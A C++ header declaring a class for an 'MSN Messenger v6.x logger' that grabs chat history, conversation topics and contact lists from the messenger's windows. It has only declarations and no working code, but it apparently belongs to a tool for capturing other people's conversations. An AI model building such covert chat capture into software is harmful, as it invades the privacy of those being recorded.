/*
* MSN Messenger v6.x logger
*
* Coded by: Quequero
* Date: 14/Mar/2008
*
*/

#include <exception>
using namespace std;

#ifndef __QMsn6_h__
#define __QMsn6_h__

#include "QOleWalker.h"
#include "QMsn.h"

class QMsn6: public QMsn
{
	public: 
		QMsn6(HWND hw);
		~QMsn6();
		BOOL GrabHistory();
		BOOL GrabTopic();
		BOOL GrabUserList();
		BOOL UpdateId(PWCHAR pwId);

		/**
		 * Torna TRUE se la finestra identificata dall'hwnd contenuto in QProperty appartiene ad MSN
		 */
		BOOL Is();
		UINT Version();
};

#endif
